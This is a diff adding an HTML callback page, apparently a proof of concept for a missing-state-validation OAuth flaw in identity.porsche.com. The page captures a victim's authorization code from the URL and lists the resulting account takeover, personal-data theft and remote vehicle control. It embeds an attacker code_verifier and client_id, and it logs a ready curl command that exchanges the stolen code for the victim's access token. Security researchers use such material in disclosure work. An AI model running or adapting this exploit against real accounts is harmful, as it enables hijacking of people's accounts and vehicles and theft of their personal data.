@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Code Captured!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 800px;
+            width: 100%;
+            padding: 40px;
+        }
+        
+        .success-box {
+            background: #d4edda;
+            border-left: 4px solid #28a745;
+            padding: 20px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+        
+        .success-box h2 {
+            color: #155724;
+            margin-bottom: 15px;
+            font-size: 22px;
+        }
+        
+        .success-box h2::before {
+            content: "✅ ";
+        }
+        
+        .code-display {
+            background: #f8f9fa;
+            border: 2px solid #28a745;
+            border-radius: 6px;
+            padding: 15px;
+            margin: 15px 0;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .impact-section {
+            background: #f8d7da;
+            border-left: 4px solid #dc3545;
+            padding: 20px;
+            border-radius: 4px;
+            margin: 20px 0;
+        }
+        
+        .impact-section h3 {
+            color: #721c24;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+        
+        .impact-section ol {
+            color: #721c24;
+            margin-left: 20px;
+        }
+        
+        .impact-section li {
+            margin: 8px 0;
+        }
+        
+        .technical-details {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 6px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .technical-details h3 {
+            color: #495057;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+        
+        .technical-details pre {
+            background: #ffffff;
+            border: 1px solid #ced4da;
+            border-radius: 4px;
+            padding: 15px;
+            overflow-x: auto;
+            font-size: 12px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="result">
+            <div class="success-box">
+                <h2>Authorization Code Successfully Captured!</h2>
+                <p><strong>Victim's Authorization Code:</strong></p>
+                <div class="code-display" id="code">Loading...</div>
+            </div>
+            
+            <div class="impact-section">
+                <h3>🎯 Attack Impact</h3>
+                <p>With this captured authorization code, an attacker can now:</p>
+                <ol>
+                    <li><strong>Exchange the code</strong> for a valid access token using their own code_verifier</li>
+                    <li><strong>Obtain full account access</strong> to the victim's Porsche account</li>
+                    <li><strong>Retrieve sensitive PII</strong> including name, email, address, date of birth, phone number</li>
+                    <li><strong>Perform account actions</strong> as the victim</li>
+                    <li><strong>Access My Porsche app features</strong> including remote vehicle control</li>
+                </ol>
+            </div>
+            
+            <div class="technical-details">
+                <h3>🔧 Technical Details</h3>
+                <pre id="details"></pre>
+            </div>
+            
+            <div class="technical-details">
+                <h3>🐛 Vulnerability Explanation</h3>
+                <p style="color: #495057; line-height: 1.6; margin-bottom: 15px;">
+                    The vulnerability exists because <code>identity.porsche.com</code> accepts OAuth authorization requests 
+                    <strong>without validating the state parameter</strong>. This allows an attacker to craft a malicious 
+                    OAuth URL with their own <code>code_challenge</code>, trick a victim into clicking it, and receive 
+                    an authorization code for the victim's account that can be exchanged using the attacker's 
+                    <code>code_verifier</code>.
+                </p>
+                <p style="color: #495057; line-height: 1.6;">
+                    <strong>Root Cause:</strong> Missing OAuth state parameter validation (RFC 6749 Section 10.12)
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Get URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const code = urlParams.get('code');
+        const error = urlParams.get('error');
+        
+        console.log('=== CALLBACK PAGE LOADED ===');
+        console.log('Full URL:', window.location.href);
+        console.log('Code:', code);
+        console.log('Error:', error);
+        
+        if (error) {
+            document.getElementById('code').textContent = 'ERROR: ' + error;
+            document.getElementById('details').textContent = JSON.stringify({
+                error: error,
+                error_description: urlParams.get('error_description')
+            }, null, 2);
+        } else if (code) {
+            // Display the captured code
+            document.getElementById('code').textContent = code;
+            
+            // Show technical details
+            const details = {
+                '🔑 Captured Authorization Code': code,
+                '👤 Victim Account': 'Will be revealed during token exchange',
+                '🔐 Attacker Code Challenge': 'GmeSLfiYZdoWUq5uT-pDo2SG2oSdA2inWl0wCZagQT8',
+                '🔓 Attacker Code Verifier': 'hgOAH9itlSHSa9sMrEGmEnKvMItB03eC9COrAQPGwRR',
+                '⏰ Timestamp': new Date().toISOString(),
+                '⚠️ Vulnerability': 'Missing OAuth state parameter validation',
+                '📋 Next Steps': 'Attacker can exchange this code with their verifier to obtain victim\'s access token'
+            };
+            
+            document.getElementById('details').textContent = JSON.stringify(details, null, 2);
+            
+            // Log token exchange command
+            console.log('\n=== TOKEN EXCHANGE COMMAND ===');
+            console.log(`
+curl -X POST 'https://identity.porsche.com/oauth/token' \\
+  -H 'Content-Type: application/x-www-form-urlencoded' \\
+  -H 'Auth0-Client: eyJuYW1lIjoiQGF1dGgwL2F1dGgwLWFuZ3VsYXIiLCJ2ZXJzaW9uIjoiMi4yLjMifQ==' \\
+  -d 'grant_type=authorization_code' \\
+  -d 'code=${code}' \\
+  -d 'code_verifier=hgOAH9itlSHSa9sMrEGmEnKvMItB03eC9COrAQPGwRR' \\
+  -d 'client_id=K2SaA3ojBmgbP95WtBYUfZwis9zM2bWB' \\
+  -d 'redirect_uri=https://bradleyjoe80.github.io/porsche-csrf-poc/callback.html'
+            `);
+        } else {
+            document.getElementById('code').textContent = 'No code received - check URL parameters';
+        }
+    </script>
+</body>
+</html>
